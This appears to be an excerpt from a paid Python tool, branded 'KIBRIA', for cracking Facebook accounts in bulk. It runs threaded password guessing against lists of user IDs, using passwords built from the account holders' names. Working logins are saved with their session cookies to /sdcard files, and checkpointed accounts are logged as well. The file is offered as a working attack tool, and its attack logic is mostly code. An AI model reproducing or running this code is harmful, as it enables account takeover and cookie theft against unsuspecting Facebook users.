...
from concurrent.futures import ThreadPoolExecutor as KIBRIA 
from string import * 
...
sys.stdout.write('\x1b]2; SAMI-XD\x07')
...
logo =f"""{A}
    ...
    {G3}  █████   ██ ██████  ██████  ██ ███████ 
    {G4}  ██  ██  ██ ██   ██ ██   ██ ██ ██   ██ 
    {G5}  ██   ██ ██ ██████  ██   ██ ██ ██   ██ " {G1}[{A}V{G1}/{A}2.6{G1}]
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} KIBRIA CHOWDHURY
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} KIBRIA CHOWDHURY
{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FILE {A}&{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} Paid 15 Days 
{A}──────────────────────────────────────────────────"""
...
def menu():   
    ...
    if select =='1':
        ...
        os.system('xdg-open KIBRIA ');menu()
    elif select =='0':
...
def _bd_():
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    clear()
    with KIBRIA (max_workers=30) as sexy:
        clear()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/KIBRIA.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}KIBRIA-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KIBRIAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KIBRIAb};{ckkk}"
                    print(f"\r\r{G1}[KIBRIA-OK] {sid} | {ps} ")
                    open('/sdcard/KIBRIA-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[KIBRIA-CP] {sid} | {ps} ")
                     open('/sdcard/KIBRIA-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}KIBRIA-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KIBRIAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KIBRIAb};{ckkk}"
                    print(f"\r\r{G1}[KIBRIA-OK] {sid} | {ps} ")
                    open('/sdcard/KIBRIA-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[KIBRIA-CP] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with KIBRIA (max_workers=30) as KIBRIAworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                KIBRIAworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                KIBRIAworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[KIBRIA-OK] {uid} | {pas}')
...
def apv():
    ...
    if key not in row:
        ...
        #####----Message link
        os.system("xdg-open https://m.me/kibriya404")
    else:
        lisens()
